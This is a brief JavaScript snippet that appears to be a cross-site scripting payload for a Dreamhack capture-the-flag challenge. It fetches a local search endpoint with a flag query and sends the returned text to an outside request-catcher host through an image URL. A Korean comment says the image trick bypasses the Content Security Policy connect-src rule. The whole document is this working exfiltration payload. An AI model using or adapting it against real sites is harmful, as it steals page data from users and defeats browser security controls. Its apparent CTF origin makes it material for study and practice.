fetch("http://127.0.0.1:12001/search?query=scpCTF").then(res=>res.text()).then(text=>{
    // 💡 new Image() 방식: CSP connect-src를 효과적으로 우회합니다.
    new Image().src = 'https://bfgtjrh.request.dreamhack.games/?data=' + encodeURIComponent(text);
});
